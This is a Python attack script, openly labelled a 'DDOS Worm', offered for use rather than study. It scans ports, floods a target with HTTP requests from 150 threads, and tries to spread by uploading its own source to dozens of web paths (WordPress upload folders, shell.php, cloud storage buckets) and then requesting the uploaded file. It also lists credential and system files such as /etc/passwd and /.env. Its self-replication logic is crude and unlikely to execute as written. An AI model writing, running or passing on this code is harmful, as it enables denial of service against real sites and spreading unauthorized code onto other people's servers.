import random
import requests
import threading
import time
import socket
import string

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.1"  # Replace with your target IP
TARGET_PORT = 80            # Default HTTP port, change to 443 for HTTPS
THREADS = 150              # Number of flood threads
USE_HTTPS = False          # Set True if target uses HTTPS

# --- RANDOM FILENAME GENERATOR ---
def random_filename(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".py"

WORM_FILENAME = random_filename()

# --- TARGET URL ---
TARGET_URL = f"http{'s' if USE_HTTPS else ''}://{TARGET_IP}:{TARGET_PORT}"

# --- EXPLOIT PATHS ---
EXPLOIT_PATHS = [
    "/wp-admin/install.php",
    "/wp-content/uploads/",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/wp-includes/",
    "/wp-config.php",
    "/administrator/components/",
    "/images/",
    "/tmp/",
    "/cache/",
    "/logs/",
    "/sites/default/files/",
    "/sites/all/modules/",
    "/sites/all/themes/",
    "/uploads/",
    "/files/",
    "/images/",
    "/assets/",
    "/media/",
    "/content/",
    "/data/",
    "/backup/",
    "/temp/",
    "/var/",
    "/storage/",
    "/api/upload",
    "/api/files",
    "/api/v1/upload",
    "/api/v2/files",
    "/rest/upload",
    "/graphql/upload",
    "/shell.php",
    "/cmd.php",
    "/backdoor.php",
    "/admin.php",
    "/test.php",
    "/var/log/",
    "/etc/passwd",
    "/proc/self/environ",
    "/.git/",
    "/.svn/",
    "/.env",
    "/backup.sql",
    "/db_backup/",
    "/sql/",
    "/admin/",
    "/login/",
    "/wp-login.php",
    "/administrator/",
    "/manager/html",
    "/phpmyadmin/",
    "/pma/",
    "/mysql/",
    f"http://{TARGET_IP}/[bucket-name]/",
    "http://s3.amazonaws.com/[bucket-name]/",
    f"https://[account].blob.core.windows.net/[container]/",
    "https://storage.googleapis.com/[bucket-name]/",
]

# --- USER AGENTS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; "
    ".NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; "
    ".NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# --- DDoS HTTP FLOOD ---
def http_flood():
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            requests.get(TARGET_URL, headers=headers, timeout=5)
            print(f"[FLOOD] Request sent to {TARGET_URL}")
        except Exception as e:
            print(f"[FLOOD] Error: {e}")
        time.sleep(random.uniform(0.1, 1.5))

# --- WORM REPLICATION ---
def replicate_worm():
    try:
        for path in EXPLOIT_PATHS:
            try:
                if path.startswith("http"):
                    upload_url = path
                else:
                    upload_url = f"{TARGET_URL}{path}{WORM_FILENAME}"
                try:
                    with open(__file__, "rb") as f:
                        files = {"file": (WORM_FILENAME, f)}
                        response = requests.post(upload_url, files=files, timeout=10)
                        if response.status_code in [200, 201, 204]:
                            print(f"[WORM] Successfully replicated to {upload_url}")
                            if not path.startswith("http"):
                                execute_url = f"{TARGET_URL}{path}{WORM_FILENAME}"
                                requests.get(execute_url, timeout=5)
                except Exception as e:
                    print(f"[WORM] Failed to replicate to {upload_url}: {e}")
            except Exception as e:
                print(f"[WORM] Path error: {e}")
    except Exception as e:
        print(f"[WORM] Replication error: {e}")

# --- PORT SCANNER ---
def scan_ports():
    open_ports = []
    for port in [80, 443, 8080, 8443, 21, 22]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((TARGET_IP, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    print(f"[SCAN] Open ports on {TARGET_IP}: {open_ports}")
    return open_ports

# --- MAIN ---
if __name__ == "__main__":
    print(f"[Storm] DDOS Worm Activated. Filename: {WORM_FILENAME}. Target: {TARGET_URL}. The digital apocalypse has begun.")

    # Scan open ports
    scan_ports()

    # Start flooding
    for _ in range(THREADS):
        threading.Thread(target=http_flood, daemon=True).start()

    # Start replication
    threading.Thread(target=replicate_worm, daemon=True).start()

    # Keep main thread alive
    while True:
        time.sleep(10)
